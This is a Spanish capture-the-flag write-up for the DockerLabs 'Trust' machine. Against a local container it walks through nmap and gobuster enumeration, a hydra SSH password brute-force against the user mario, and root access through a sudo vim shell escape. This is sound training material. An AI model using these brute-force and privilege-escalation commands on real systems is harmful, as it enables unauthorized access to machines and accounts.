# Máquina Trust
- Dificultad: muy fácil

## Escaneo con nmap
<p>Realizamos un escaneo de puertos, servicios y versiones con el siguiente comando.</p>

```
nmap -sCV -sS -n -Pn -p- 172.17.0.2

```

```
Nmap scan report for 172.17.0.2
Host is up (0.000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
<p>El puerto 22 y el 80 estan abiertos con los servicios SSH y Apache, primero revisamos el servicio web y utilizamos gobuster para buscar posibles directorios.</p>

## Gobuster

```
 gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,py

```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================



```
<p>Encontramos dos archivos, en index.html no encontré nada asi que revisamos el secret.php.</p>

![captura-login](https://github.com/JavierKJ4/Dockerlabs/blob/main/recursos/Screenshot_2024-05-13_06-40-18.png)


<p>Probamos fuerza bruta con hydra usando como usuario mario.</p>


## Hydra

```
hydra -l mario  -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 

```
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-13 06:42:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found

```
<p>Usamos las credenciales de mario:chocolate con ssh.</p>

## SSH

```
ssh 172.17.0.2 -l mario

```
<p>Nos pide la contraceña, la escribimos y estamos dentro.</p>

```
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:z6uc1wEgwh6GGiDrEIM8ABQT1LGC4CfYAYnV4GXRUVE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
mario@172.17.0.2's password: 
Linux b32b2acaa846 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
mario@b32b2acaa846:~$ 


```

## Escalando privilegios

<p>Usamos el siguiente comando para ver que se puede ejecutar como sudo.</p>

```
sudo -l

```

```
Matching Defaults entries for mario on b32b2acaa846:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on b32b2acaa846:
    (ALL) /usr/bin/vim

```

<p>Aparece el binario /usr/bin/vim asi que ejecutamos el sigiente comando y estamos como root.</p>

```
sudo vim -c ':!/bin/sh'

```

```
# whoami
root
# 
```
